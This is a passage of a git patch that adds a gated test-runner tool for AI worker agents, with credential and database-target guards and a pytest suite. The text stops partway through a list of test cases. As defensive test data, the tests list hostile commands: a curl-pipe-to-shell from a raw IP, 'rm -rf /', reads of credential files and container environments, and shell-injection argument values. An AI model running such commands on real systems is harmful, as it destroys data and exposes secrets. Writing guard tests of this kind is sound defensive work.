@@ -1,0 +1,1511 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: NorkzYT <richard@pcscorp.dev>
+Date: Mon, 2 Nov 2026 20:30:00 -0500
+Subject: [PATCH 4/4] feat(kanban): typed dev_test_run tool that fails closed
+ without an attested isolation backend, scanner recovery and test-credential
+ guards
+
+Exact `git diff 4f845b43ec..61cbead82d` of the runtime branch
+feat/kanban-autonomous-reviewed: commits d15a70ddc8 (typed dev_test_run tool,
+scanner recovery and test-credential guards), f04d4adc80 (fails closed on
+rejected isolation, scoped recovery state, stricter target guard) and
+61cbead82d (readiness needs an attested backend, not a mode string). The base
+4f845b43ec is the third commit carried by 0003, so this patch contains no hunk
+of 0001-0003 (the previous 0004 was cut against the wrong base and repeated
+the agent/kanban_stop.py and tests/agent/test_kanban_stop.py hunks of 0003).
+
+The registry must carry per-profile isolation.mode. `same-uid-landlock` is a
+rejected design and `credential-broker-netns` is a recognised *proposed* design
+string: syntactic config validity only. Runnable readiness needs
+backend_attested() to pass, and no isolation backend is implemented, so at
+every surface (tool visibility, RECOVERY directive, dev_test_run, kanban_block)
+nothing is exposed regardless of what a root-owned registry declares; the
+refusal names the missing implementation. The additive credential and file
+guards read the trusted registry leniently so an older registry without
+isolation.mode keeps blocking credential reads. Recovery state is scoped per
+(task, run) and cleared only by an actual runner start or a recorded
+precondition refusal. database_target_block covers ?host=, multi-host
+authorities, hostaddr=, PGHOSTADDR and PGSERVICE* (text guard, not a
+boundary). Result keys are redacted; the runner budget covers vet.
+
+Tirith stays enabled and fail-closed, single-query/cron/unattended modes stay
+deny, hardline and deny rules are unchanged.
+---
+ agent/file_safety.py              |  22 ++
+ tests/tools/test_dev_test_tool.py | 655 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ tools/approval.py                 |  45 +++-
+ tools/dev_test_tool.py            | 667 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ tools/kanban_tools.py             |  13 ++
+ 5 files changed, 1400 insertions(+), 2 deletions(-)
+
+diff --git a/agent/file_safety.py b/agent/file_safety.py
+index 1ee92367ad..018f81568c 100644
+--- a/agent/file_safety.py
++++ b/agent/file_safety.py
+@@ -256,9 +256,31 @@ def get_read_block_error(path: str) -> Optional[str]:
+                 "is a secret-bearing environment file and cannot be read to prevent credential "
+                 "leakage. If you need to check the file structure, read .env.example instead." + _DID_SUFFIX
+             )
++        if reason is None and _is_registered_devtest_credential(resolved):
++            reason = (
++                "is a registered test-database credential file and cannot be read. The dev_test_run "
++                "tool hands it to the sandboxed tests only." + _DID_SUFFIX
++            )
+     return f"Access denied: {path} {reason}" if reason else None
+ 
+ 
++def _is_registered_devtest_credential(resolved: Path) -> bool:
++    """The credential files (and their directories) named by the root-owned dev-test profile
++    registry (tools.dev_test_tool); no registry means nothing extra is blocked."""
++    try:
++        from tools.dev_test_tool import registered_or_none
++        cfg = registered_or_none()
++    except Exception:
++        return False
++    for prof in (cfg or {}).get("profiles", {}).values():
++        path = ((prof or {}).get("database") or {}).get("pgpassfile")
++        if isinstance(path, str) and path:
++            target = Path(path).resolve()
++            if resolved == target or _is_under(resolved, target.parent):
++                return True
++    return False
++
++
+ def raise_if_read_blocked(path: str) -> None:
+     """Raise ``ValueError`` if ``path`` is a denied Hermes read (see ``get_read_block_error``).
+ 
+diff --git a/tests/tools/test_dev_test_tool.py b/tests/tools/test_dev_test_tool.py
+new file mode 100644
+index 0000000000..c68885317b
+--- /dev/null
++++ b/tests/tools/test_dev_test_tool.py
+@@ -0,0 +1,655 @@
++"""dev_test_run: the typed, registered Go/PostgreSQL test path for Kanban workers, plus the
++scanner-recovery and credential/database-target guards it brings.
++
++The approval tests run the REAL unattended gate in single-query (-q) mode with the operator's
++real ``security``/``approvals`` config sections and the real Tirith binary (skipped when it is
++not installed), so the exact run-370 rejection is reproduced, not mocked. The registry is a
++throwaway file trusted for this uid; credentials are synthetic canaries. Nothing executes a
++test or reads the operator's credential file.
++"""
++
++from __future__ import annotations
++
++import hashlib
++import json
++import os
++import pwd
++import shutil
++import subprocess
++import tempfile
++from pathlib import Path
++from unittest.mock import patch
++
++import pytest
++import yaml
++
++import tools.approval as approval_module
++from gateway.session_context import reset_session_vars
++from tools import dev_test_tool as dtt
++from tools.approval import check_all_command_guards
++
++REAL_HOME = pwd.getpwuid(os.getuid()).pw_dir
++REAL_TIRITH = os.path.join(REAL_HOME, ".hermes", "bin", "tirith")
++REAL_CONFIG = os.path.join(REAL_HOME, ".hermes", "config.yaml")
++CANARY = "CANARY-pw-0d9e-not-a-real-secret"
++PGPASS = os.path.join(REAL_HOME, ".config", "hermes-test-db", "pgpass")
++RUN370 = ("PGPASSFILE=/home/polymath-dev/.config/hermes-test-db/pgpass "
++          "MATCHING_TEST_DATABASE_URL='postgresql://postgres@127.0.0.1:55443/matching_test?sslmode=disable' "
++          "go test -race -p 1 -count=1 ./... && go vet ./...")
++
++
++def _real_policy() -> dict:
++    """Only the security/approvals sections of the operator's real config (no other keys)."""
++    try:
++        with open(REAL_CONFIG, encoding="utf-8") as fh:
++            cfg = yaml.safe_load(fh) or {}
++    except OSError:
++        cfg = {}
++    return {"security": cfg.get("security") or {}, "approvals": cfg.get("approvals") or {},
++            "command_allowlist": cfg.get("command_allowlist") or []}
++
++
++APPROVED_MODE = "credential-broker-netns"
++REJECTED_MODE = "same-uid-landlock"
++
++
++def _make_registry(monkeypatch, mode):
++    """A trusted (this uid) registry + runner copy in a private dir under the real home."""
++    root = Path(tempfile.mkdtemp(prefix="devtest-reg-", dir=REAL_HOME))
++    os.chmod(root, 0o755)
++    helper = root / "hermes-devtest-runner"
++    helper.write_text("#!/usr/bin/python3 -IS\nprint('{}')\n")
++    os.chmod(helper, 0o755)
++    cfg = {"version": 1, "helper": str(helper), "python": "/usr/bin/python3",
++           "helper_sha256": hashlib.sha256(helper.read_bytes()).hexdigest(),
++           "profiles": {"validate-matching": {
++               "checkout": "/opt/repos/validate", "module": "apps/matching-service-go",
++               "read_roots": ["apps/matching-service-go"], "packages": ["./..."], "container": "validate-pgtest-door",
++               "isolation": {"mode": mode},
++               "database": {"host": "127.0.0.1", "port": 55443, "dbname": "matching_test", "user": "postgres",
++                            "sslmode": "disable", "url_env": "MATCHING_TEST_DATABASE_URL", "pgpassfile": PGPASS}}}}
++    path = root / "profiles.json"
++    _write_registry(path, cfg)
++    monkeypatch.setattr(dtt, "CONFIG_PATH", str(path))
++    monkeypatch.setattr(dtt, "TRUSTED_UID", os.getuid())
++    return {"root": root, "path": path, "helper": helper, "cfg": cfg}
++
++
++def _write_registry(path, cfg):
++    Path(path).write_text(json.dumps(cfg))
++    os.chmod(path, 0o644)
++
++
++@pytest.fixture
++def registry_file(monkeypatch):
++    """Registry whose profile carries the approved isolation mode (directive path enabled)."""
++    reg = _make_registry(monkeypatch, APPROVED_MODE)
++    yield reg
++    shutil.rmtree(reg["root"], ignore_errors=True)
++
++
++@pytest.fixture
++def rejected_registry(monkeypatch):
++    """Registry whose profile carries the rejected same-UID isolation mode."""
++    reg = _make_registry(monkeypatch, REJECTED_MODE)
++    yield reg
++    shutil.rmtree(reg["root"], ignore_errors=True)
++
++
++@pytest.fixture
++def attested_backend(monkeypatch):
++    """Simulates a FUTURE attested broker so the recovery state machine and the fixed runner
++    invocation can be exercised. Production ``backend_attested`` never returns None today: no
++    isolation backend is implemented, so the tests below that use this fixture describe how the
++    tool would behave once a real broker probe exists, not what a worker can do now."""
++    monkeypatch.setattr(dtt, "backend_attested", lambda cfg, name, prof: None)
++
++
++@pytest.fixture
++def worker_env(monkeypatch):
++    monkeypatch.setenv("HERMES_KANBAN_TASK", "t_12345678")
++    monkeypatch.setenv("HERMES_KANBAN_RUN_ID", "77")
++    monkeypatch.delenv("HERMES_DELEGATED_CHILD", raising=False)
++    monkeypatch.delenv("HERMES_KANBAN_DELEGATED_CHILD", raising=False)
++
++
++@pytest.fixture
++def headless(monkeypatch):
++    """Single-query (-q) worker session with the real policy and the real Tirith binary."""
++    if not os.access(REAL_TIRITH, os.X_OK):
++        pytest.skip("real tirith binary not installed")
++    policy = _real_policy()
++    monkeypatch.setenv("HERMES_SINGLE_QUERY_SESSION", "1")
++    monkeypatch.setenv("HERMES_INTERACTIVE", "1")
++    monkeypatch.setenv("TIRITH_BIN", REAL_TIRITH)
++    for var in ("HERMES_YOLO_MODE", "TIRITH_FAIL_OPEN", "TIRITH_ENABLED", "HERMES_GATEWAY_SESSION", "HERMES_CRON_SESSION"):
++        monkeypatch.delenv(var, raising=False)
++    approval_module._permanent_approved.clear()
++    approval_module.clear_session("default")
++    reset_session_vars()
++    dtt._reset_recovery_state()
++    with patch("hermes_cli.config.load_config_readonly", return_value=policy):
++        assert policy["security"].get("tirith_fail_open") is False, "operator config must stay fail-closed"
++        assert (policy["approvals"].get("single_query_mode") or "deny") == "deny"
++        yield policy
++    approval_module._permanent_approved.clear()
++    reset_session_vars()
++    dtt._reset_recovery_state()
++
++
++# ------------------------------------------------------------ arguments ---
++
++def _cfg():
++    return {"profiles": {"validate-matching": {}}}
++
++
++@pytest.mark.parametrize("args", [
++    {"profile": "validate-matching", "database_url": "postgresql://postgres@10.0.0.5/prod"},
++    {"profile": "validate-matching", "env": {"PGHOST": "prod"}},
++    {"profile": "validate-matching", "flags": ["-toolexec=/bin/sh"]},
++    {"profile": "prod"},
++    {"profile": "validate-matching", "packages": ["../other"]},
++    {"profile": "validate-matching", "packages": ["-exec=/bin/sh"]},
++    {"profile": "validate-matching", "packages": ["./a;id"]},
++    {"profile": "validate-matching", "run": "Test Foo"},
++    {"profile": "validate-matching", "run": "`id`"},
++    {"profile": "validate-matching", "race": "yes"},
++    {"profile": "validate-matching", "timeout_seconds": 5},
++    {"profile": "validate-matching", "timeout_seconds": True},
++])
++def test_invalid_arguments_are_refused(args):
++    with pytest.raises(dtt.DevTestRefused):
++        dtt.validate_args(args, _cfg())
++
++
++def test_valid_arguments_build_the_fixed_invocation():
++    req = dtt.validate_args({"profile": "validate-matching", "packages": ["./...", "./internal/db"],
++                             "run": "^TestDoor$", "vet": True}, _cfg())
++    argv = dtt.runner_argv({"helper": "/usr/local/libexec/hermes-devtest-runner"}, "/usr/bin/python3",
++                           "t_12345678", "77", req)
++    assert argv == ["/usr/bin/python3", "-I", "-S", "/usr/local/libexec/hermes-devtest-runner", "run",
++                    "--task", "t_12345678", "--run-id", "77", "--profile", "validate-matching",
++                    "--package", "./...", "--package", "./internal/db", "--race", "--run", "^TestDoor$", "--vet",
++                    "--timeout", "1200"]
++
++
++# ---------------------------------------------------------------- trust ---
++
++def test_registry_must_be_trusted(registry_file, monkeypatch):
++    assert dtt.load_registry()["profiles"]
++    monkeypatch.setattr(dtt, "TRUSTED_UID", 0)
++    with pytest.raises(dtt.DevTestRefused, match="owned by uid 0"):
++        dtt.load_registry()
++    monkeypatch.setattr(dtt, "TRUSTED_UID", os.getuid())
++    os.chmod(registry_file["path"], 0o664)
++    with pytest.raises(dtt.DevTestRefused, match="group/other writable"):
++        dtt.load_registry()
++    os.chmod(registry_file["path"], 0o644)
++    link = registry_file["root"] / "link.json"
++    link.symlink_to(registry_file["path"])
++    with pytest.raises(dtt.DevTestRefused, match="symlink"):
++        dtt.load_registry(str(link))
++
++
++def test_runner_digest_is_verified_every_time(registry_file):
++    cfg = dtt.load_registry()
++    assert dtt.verify_runner(cfg) == "/usr/bin/python3"
++    registry_file["helper"].write_text("#!/usr/bin/python3 -IS\nimport os; os.system('id')\n")
++    with pytest.raises(dtt.DevTestRefused, match="pinned SHA-256"):
++        dtt.verify_runner(dtt.load_registry())
++
++
++def test_only_the_dispatcher_owned_worker(monkeypatch, worker_env):
++    assert dtt.worker_identity() == ("t_12345678", "77")
++    from agent import delegation_context
++    monkeypatch.setenv(delegation_context.DELEGATED_CHILD_ENV_MARKER, "1")
++    with pytest.raises(dtt.DevTestRefused, match="dispatcher-owned"):
++        dtt.worker_identity()
++    monkeypatch.delenv(delegation_context.DELEGATED_CHILD_ENV_MARKER)
++    monkeypatch.delenv("HERMES_KANBAN_TASK")
++    with pytest.raises(dtt.DevTestRefused):
++        dtt.worker_identity()
++
++
++# ------------------------------------------------- headless real gate ---
++
++def test_run370_command_is_rejected_with_a_recovery_directive(attested_backend, headless, registry_file, worker_env):
++    verdict = check_all_command_guards(RUN370, "local")
++    assert verdict["approved"] is False
++    # The exact run-370 finding: Tirith raw_ip_url + schemeless_to_sink (MEDIUM), single-query deny.
++    assert "[MEDIUM] URL uses raw IP address" in verdict["message"]
++    assert "Schemeless URL in sink context" in verdict["message"]
++    assert "single-query mode (-q)" in verdict["message"]
++    assert "RECOVERY" in verdict["message"] and 'dev_test_run(profile="validate-matching"' in verdict["message"]
++    assert dtt.pending_recovery()["profile"] == "validate-matching"
++    refusal = dtt.block_refusal()
++    assert refusal and "dev_test_run" in refusal
++    dtt.mark_recovery_attempted()
++    assert dtt.block_refusal() is None
++
++
++def test_rejection_without_registered_equivalent_has_no_directive(headless, worker_env, monkeypatch):
++    monkeypatch.setattr(dtt, "CONFIG_PATH", "/nonexistent/profiles.json")
++    verdict = check_all_command_guards(RUN370, "local")
++    assert verdict["approved"] is False
++    assert "RECOVERY" not in verdict["message"]
++    assert dtt.block_refusal() is None
++
++
++def test_fixed_runner_invocation_passes_the_real_scanner(headless, registry_file, worker_env):
++    req = dtt.validate_args({"profile": "validate-matching", "vet": True}, _cfg())
++    argv = dtt.runner_argv({"helper": "/usr/local/libexec/hermes-devtest-runner"}, "/usr/bin/python3",
++                           "t_12345678", "77", req)
++    import shlex
++    assert check_all_command_guards(shlex.join(argv), "local")["approved"] is True
++
++
++@pytest.mark.parametrize("command", [
++    "go test ./...", "go test -race -count=1 -p 1 ./...", "go vet ./...", "go build ./...",
++    "gofmt -l .", "git status --short", "python3 -m pytest -q tests/unit",
++])
++def test_ordinary_development_commands_still_pass(headless, registry_file, worker_env, command):
++    assert check_all_command_guards(command, "local")["approved"] is True
++
++
++@pytest.mark.parametrize("command", [
++    f"cat {PGPASS}",
++    "cat ~/.config/hermes-test-db/pgpass",
++    "base64 $HOME/.config/hermes-test-db/pgpass",
++    "ls -la ~/.config/hermes-test-db",
++    f"PGPASSFILE={PGPASS} sh -c 'cat $PGPASSFILE'",
++    "docker exec validate-pgtest-door env",
++    "docker inspect validate-pgtest-door",
++    "docker container exec -it validate-pgtest-door printenv POSTGRES_PASSWORD",
++])
++def test_credential_extraction_stays_blocked_even_under_yolo(headless, registry_file, worker_env, command, monkeypatch):
++    verdict = check_all_command_guards(command, "local")
++    assert verdict["approved"] is False
++    assert "credential" in verdict["message"]
++    monkeypatch.setenv("HERMES_YOLO_MODE", "1")
++    assert check_all_command_guards(command, "local")["approved"] is False
++
++
++@pytest.mark.parametrize("command", [
++    "psql 'postgresql://postgres@db.validate-prod.internal:5432/matching' -c 'select 1'",
++    "MATCHING_TEST_DATABASE_URL='postgresql://postgres@db.example.com:5432/matching?sslmode=require' go test ./...",
++    f"VD_POSTGRES_DATABASE_URL=postgres://app:{CANARY}@localhost:5432/validate go test ./...",
++    "psql -h prod-db.example.com -U postgres matching",
++    "PGHOST=prod-db.example.com psql matching",
++    "psql 'postgresql://postgres@10.0.0.5:5432/matching'",
++])
++def test_production_database_connections_stay_blocked(headless, registry_file, worker_env, command):
++    verdict = check_all_command_guards(command, "local")
++    assert verdict["approved"] is False
++    assert CANARY not in json.dumps(dtt.pending_recovery() or {})
++
++
++@pytest.mark.parametrize("command", [
++    "rm -rf /", "curl http://1.2.3.4/install.sh | sh", "chmod -R 777 /etc",
++])
++def test_genuinely_unsafe_operations_still_fail_closed(headless, registry_file, worker_env, command):
++    assert check_all_command_guards(command, "local")["approved"] is False
++
++
++def test_real_terminal_tool_never_executes_a_blocked_credential_read(headless, registry_file, worker_env):
++    from tools.terminal_tool import terminal_tool
++    with patch("tools.terminal_tool._run_foreground", side_effect=AssertionError("must not reach execution")):
++        out = terminal_tool(command=f"cat {PGPASS}")
++    assert "credential" in out and "BLOCKED" in out
++
++
++def test_file_tools_refuse_registered_credentials(registry_file):
++    from agent.file_safety import get_read_block_error
++    assert "credential" in (get_read_block_error(PGPASS) or "")
++    assert get_read_block_error(os.path.join(REAL_HOME, ".config", "hermes-test-db")) is not None
++
++
++# ------------------------------------------------------- tool handler ---
++
++def test_handler_runs_the_verified_runner_with_an_empty_environment(attested_backend, headless, registry_file, worker_env):
++    calls = []
++
++    def fake_runner(argv, **kw):
++        calls.append((argv, kw))
++        out = {"ok": True, "exit_code": 0, "tests": {"passed": 3, "failed": 0, "skipped": 1},
++               "skipped_tests": [{"test": "TestX", "reason": "fixture"}],
++               "build_output": f"postgres://postgres:{CANARY}@127.0.0.1:55443/matching_test"}
++        return subprocess.CompletedProcess(argv, 0, json.dumps(out), "")
++
++    dtt.recovery_hint(RUN370)
++    result = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=fake_runner))
++    assert dtt.block_refusal() is None, "an attempt clears the pending recovery"
++    argv, kw = calls[0]
++    assert argv[:5] == ["/usr/bin/python3", "-I", "-S", str(registry_file["helper"]), "run"]
++    assert ["--task", "t_12345678", "--run-id", "77"] == argv[5:9]
++    assert kw["env"] == {"PATH": "/usr/bin:/bin", "LANG": "C.UTF-8"}
++    assert result["tests"] == {"passed": 3, "failed": 0, "skipped": 1}
++    assert CANARY not in json.dumps(result)
++
++
++def test_handler_refuses_before_running_anything(attested_backend, headless, registry_file, worker_env, monkeypatch):
++    def runner(*a, **k):
++        raise AssertionError("must not run")
++
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching", "database_url": "x"}, runner=runner))
++    assert "refused" in out["error"]
++    registry_file["helper"].write_text("tampered\n")
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=runner))
++    assert "pinned SHA-256" in out["error"]
++    monkeypatch.delenv("HERMES_KANBAN_TASK")
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=runner))
++    assert "dispatcher-owned" in out["error"]
++
++
++def test_kanban_block_refuses_once_until_the_equivalent_was_tried(attested_backend, headless, registry_file, worker_env):
++    from tools import kanban_tools
++    dtt.recovery_hint(RUN370)
++    with pytest.raises(kanban_tools._Reject) as exc:
++        kanban_tools._check_scanner_recovery()
++    assert "dev_test_run" in str(exc.value)
++    dtt.mark_recovery_attempted()
++    kanban_tools._check_scanner_recovery()
++
++
++def test_tool_is_registered_in_the_kanban_toolset_for_workers_only(attested_backend, registry_file, worker_env, monkeypatch):
++    from tools.registry import registry
++    assert "dev_test_run" in registry.get_tool_names_for_toolset("kanban")
++    assert dtt._check_fn() is True
++    monkeypatch.setattr(dtt, "CONFIG_PATH", "/nonexistent/profiles.json")
++    assert dtt._check_fn() is False
++    monkeypatch.setattr(dtt, "CONFIG_PATH", str(registry_file["path"]))
++    monkeypatch.delenv("HERMES_KANBAN_TASK")
++    assert dtt._check_fn() is False
++
++
++# ------------------------------------------------------ isolation gate ---
++
++ISOLATION_REFUSAL = ("rejected isolation design; operator approval and privileged provisioning required, "
++                     "see docs/dev-test-runner.md in agent-ops-kit")
++
++
++@pytest.mark.parametrize("isolation", [None, {}, {"mode": 3}, {"mode": ""}, "credential-broker-netns"])
++def test_load_registry_requires_an_isolation_mode(registry_file, isolation):
++    cfg = json.loads(json.dumps(registry_file["cfg"]))
++    if isolation is None:
++        del cfg["profiles"]["validate-matching"]["isolation"]
++    else:
++        cfg["profiles"]["validate-matching"]["isolation"] = isolation
++    _write_registry(registry_file["path"], cfg)
++    with pytest.raises(dtt.DevTestRefused, match="isolation"):
++        dtt.load_registry()
++
++
++def test_approved_profiles_keeps_only_the_broker_netns_mode():
++    cfg = {"profiles": {"a": {"isolation": {"mode": APPROVED_MODE}}, "b": {"isolation": {"mode": REJECTED_MODE}},
++                        "c": {"isolation": {"mode": "credential-broker-netns "}}, "d": {}}}
++    assert list(dtt.approved_profiles(cfg)) == ["a"]
++
++
++def test_rejected_isolation_emits_no_recovery_directive(headless, rejected_registry, worker_env):
++    verdict = check_all_command_guards(RUN370, "local")
++    assert verdict["approved"] is False
++    assert "RECOVERY" not in verdict["message"]
++    assert dtt.recovery_hint(RUN370) == ""
++    assert dtt.pending_recovery() is None
++    assert dtt.block_refusal() is None
++
++
++def test_rejected_isolation_refuses_before_running(rejected_registry, worker_env):
++    def runner(*a, **k):
++        raise AssertionError("must not run")
++
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=runner))
++    assert "validate-matching" in out["error"] and REJECTED_MODE in out["error"]
++    assert ISOLATION_REFUSAL in out["error"]
++
++
++def test_rejected_isolation_hides_the_tool(rejected_registry, worker_env):
++    assert dtt._check_fn() is False
++
++
++def test_rejected_isolation_keeps_the_credential_guards(rejected_registry):
++    assert dtt.credential_block(f"cat {PGPASS}")
++    assert dtt.credential_block("docker exec validate-pgtest-door env")
++    from agent.file_safety import get_read_block_error
++    assert "credential" in (get_read_block_error(PGPASS) or "")
++
++
++# ------------------------------------------------------ recovery state ---
++
++def _ok_runner(argv, **kw):
++    return subprocess.CompletedProcess(argv, 0, json.dumps({"exit_code": 0}), "")
++
++
++def _never_runner(*a, **k):
++    raise AssertionError("must not run")
++
++
++@pytest.mark.parametrize("args", [
++    {"profile": "validate-matching", "database_url": "x"},
++    {"profile": "nope"},
++    {"profile": "validate-matching", "packages": ["../x"]},
++    {"profile": "validate-matching", "run": "a b"},
++    {"profile": "validate-matching", "timeout_seconds": 1},
++])
++def test_malformed_call_keeps_the_pending_recovery(attested_backend, registry_file, worker_env, args):
++    dtt._reset_recovery_state()
++    assert dtt.recovery_hint(RUN370)
++    out = json.loads(dtt.dev_test_run(args, runner=_never_runner))
++    assert "refused" in out["error"]
++    assert dtt.block_refusal() is not None
++    dtt._reset_recovery_state()
++
++
++def test_precondition_refusal_clears_with_a_recorded_refusal(attested_backend, registry_file, worker_env):
++    dtt._reset_recovery_state()
++    assert dtt.recovery_hint(RUN370)
++    registry_file["helper"].write_text("tampered\n")
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert "pinned SHA-256" in out["error"]
++    assert dtt.block_refusal() is None
++    assert "pinned SHA-256" in dtt.pending_recovery()["refused"]
++    dtt._reset_recovery_state()
++
++
++def test_rejected_isolation_refusal_of_the_named_profile_is_a_precondition(attested_backend, registry_file, worker_env):
++    dtt._reset_recovery_state()
++    assert dtt.recovery_hint(RUN370)
++    cfg = json.loads(json.dumps(registry_file["cfg"]))
++    cfg["profiles"]["validate-matching"]["isolation"]["mode"] = REJECTED_MODE
++    _write_registry(registry_file["path"], cfg)
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert ISOLATION_REFUSAL in out["error"]
++    assert dtt.block_refusal() is None
++    assert REJECTED_MODE in dtt.pending_recovery()["refused"]
++    dtt._reset_recovery_state()
++
++
++def test_refusal_for_another_profile_keeps_the_pending_recovery(attested_backend, registry_file, worker_env):
++    dtt._reset_recovery_state()
++    cfg = json.loads(json.dumps(registry_file["cfg"]))
++    cfg["profiles"]["other-legacy"] = {**cfg["profiles"]["validate-matching"], "isolation": {"mode": REJECTED_MODE},
++                                       "database": {"host": "127.0.0.1", "port": 1, "dbname": "zz_unrelated"}}
++    _write_registry(registry_file["path"], cfg)
++    assert 'profile="validate-matching"' in dtt.recovery_hint(RUN370)
++    out = json.loads(dtt.dev_test_run({"profile": "other-legacy"}, runner=_never_runner))
++    assert ISOLATION_REFUSAL in out["error"]
++    assert dtt.block_refusal() is not None
++    dtt._reset_recovery_state()
++
++
++def test_runner_start_clears_the_pending_recovery_for_any_exit(attested_backend, registry_file, worker_env):
++    dtt._reset_recovery_state()
++    assert dtt.recovery_hint(RUN370)
++    dtt.dev_test_run({"profile": "validate-matching"},
++                     runner=lambda argv, **kw: subprocess.CompletedProcess(argv, 1, "garbage", ""))
++    assert dtt.pending_recovery() is None and dtt.block_refusal() is None
++
++
++def test_pending_recovery_is_scoped_to_the_worker_identity(attested_backend, registry_file, worker_env, monkeypatch):
++    dtt._reset_recovery_state()
++    assert dtt.recovery_hint(RUN370)
++    assert dtt.block_refusal() is not None
++    monkeypatch.setenv("HERMES_KANBAN_RUN_ID", "78")
++    assert dtt.pending_recovery() is None and dtt.block_refusal() is None
++    monkeypatch.setenv("HERMES_KANBAN_TASK", "t_87654321")
++    monkeypatch.setenv("HERMES_KANBAN_RUN_ID", "77")
++    assert dtt.block_refusal() is None
++    dtt.dev_test_run({"profile": "validate-matching"}, runner=_ok_runner)
++    monkeypatch.setenv("HERMES_KANBAN_TASK", "t_12345678")
++    assert dtt.block_refusal() is not None, "another identity's attempt does not clear this one"
++    monkeypatch.delenv("HERMES_KANBAN_TASK")
++    assert dtt.pending_recovery() is None and dtt.block_refusal() is None
++    dtt._reset_recovery_state()
++
++
++# ------------------------------------------- readiness without a backend ---
++# Red against runtime f04d4adc80: a root-owned registry declaring the recognised mode string
++# unhid the tool, emitted RECOVERY directives and made kanban_block refuse while every run
++# exited "not implemented". A mode string is config validity, never readiness.
++
++def test_recognised_mode_string_alone_exposes_nothing(headless, registry_file, worker_env):
++    cfg = dtt.load_registry()
++    assert list(dtt.approved_profiles(cfg)) == ["validate-matching"], "syntactically valid"
++    assert dtt.runnable_profiles(cfg) == {}, "but nothing is runnable without an attested backend"
++    assert dtt._check_fn() is False, "tool hidden"
++    verdict = check_all_command_guards(RUN370, "local")
++    assert verdict["approved"] is False
++    assert "RECOVERY" not in verdict["message"], "no directive points at a tool that cannot run"
++    assert dtt.recovery_hint(RUN370) == ""
++    assert dtt.pending_recovery() is None and dtt.block_refusal() is None, "kanban_block stays allowed"
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert dtt.NOT_IMPLEMENTED_REFUSAL in out["error"] and APPROVED_MODE in out["error"]
++    assert "operator approval and privileged provisioning required" in out["error"]
++
++
++def test_backend_attestation_is_never_a_string_flag_or_environment(registry_file, worker_env, monkeypatch):
++    for var in ("HERMES_DEVTEST_BROKER_READY", "HERMES_DEVTEST_ATTESTED", "HERMES_DEVTEST_ISOLATION"):
++        monkeypatch.setenv(var, "1")
++    cfg = json.loads(json.dumps(registry_file["cfg"]))
++    cfg["profiles"]["validate-matching"]["isolation"].update({"attested": True, "ready": True, "approved": True,
++                                                              "broker_socket": "/run/hermes-devtest/broker.sock"})
++    cfg["isolation_ready"] = True
++    _write_registry(registry_file["path"], cfg)
++    loaded = dtt.load_registry()
++    assert dtt.backend_attested(loaded, "validate-matching", loaded["profiles"]["validate-matching"]) == dtt.NOT_IMPLEMENTED_REFUSAL
++    assert dtt.runnable_profiles(loaded) == {}
++    assert dtt._check_fn() is False
++    assert dtt.recovery_hint(RUN370) == ""
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert dtt.NOT_IMPLEMENTED_REFUSAL in out["error"]
++
++
++def test_not_implemented_refusal_is_recorded_as_a_precondition(registry_file, worker_env):
++    """A pending recovery (only possible once a backend attests) is resolved by the
++    not-implemented refusal exactly like any other precondition outside the worker's control."""
++    dtt._reset_recovery_state()
++    identity = dtt.worker_identity()
++    with dtt._RECOVERY_LOCK:
++        dtt._PENDING_RECOVERY[identity] = {"profile": "validate-matching", "at": 0.0}
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert dtt.NOT_IMPLEMENTED_REFUSAL in out["error"]
++    assert dtt.block_refusal() is None
++    assert dtt.NOT_IMPLEMENTED_REFUSAL in dtt.pending_recovery()["refused"]
++    dtt._reset_recovery_state()
++
++
++def test_legacy_registry_without_isolation_keeps_the_guards_and_exposes_nothing(registry_file, worker_env):
++    """An older trusted registry that predates ``isolation.mode`` must still block credential
++    reads (additive guards never depend on runnable readiness) while every readiness surface
++    stays closed."""
++    cfg = json.loads(json.dumps(registry_file["cfg"]))
++    del cfg["profiles"]["validate-matching"]["isolation"]
++    _write_registry(registry_file["path"], cfg)
++    with pytest.raises(dtt.DevTestRefused, match="isolation"):
++        dtt.load_registry()
++    assert dtt.runnable_registry_or_none() is None
++    assert dtt.registered_or_none() is not None, "the guards still see the trusted registry"
++    assert dtt.credential_block(f"cat {PGPASS}")
++    assert dtt.credential_block("base64 ~/.config/hermes-test-db/pgpass")
++    assert dtt.credential_block("docker exec validate-pgtest-door env")
++    from agent.file_safety import get_read_block_error
++    assert "credential" in (get_read_block_error(PGPASS) or "")
++    assert dtt._check_fn() is False
++    assert dtt.recovery_hint(RUN370) == ""
++    out = json.loads(dtt.dev_test_run({"profile": "validate-matching"}, runner=_never_runner))
++    assert "isolation.mode" in out["error"]
++
++
++def test_guard_registry_still_requires_trust_and_shape(registry_file):
++    os.chmod(registry_file["path"], 0o666)
++    assert dtt.registered_or_none() is None, "a group/other-writable registry is not trusted even for guards"
++    os.chmod(registry_file["path"], 0o644)
++    _write_registry(registry_file["path"], {"version": 2, "profiles": {}})
++    assert dtt.registered_or_none() is None
++    assert dtt.credential_block(f"cat {PGPASS}") is None
++
++
++# ------------------------------------------------ database target guard ---
++
++@pytest.mark.parametrize("command", [
++    "psql 'postgresql://u@127.0.0.1:5432/x?host=db.prod.internal'",
++    "psql 'postgresql://u@localhost/x?sslmode=disable&host=10.0.0.5'",
++    "psql 'postgresql:///x?hostaddr=10.0.0.5'",
++    "psql 'postgresql://u@127.0.0.1/x?host=localhost,db.prod.internal'",
++    "psql 'host=localhost hostaddr=10.0.0.5 dbname=x'",
++    "psql 'hostaddr=10.0.0.5 dbname=x'",
++    "psql 'postgresql://u@127.0.0.1:5432,db.prod.internal:5432/x'",
++    "psql 'postgresql://u@db.prod.internal:5432,127.0.0.1:5432/x'",
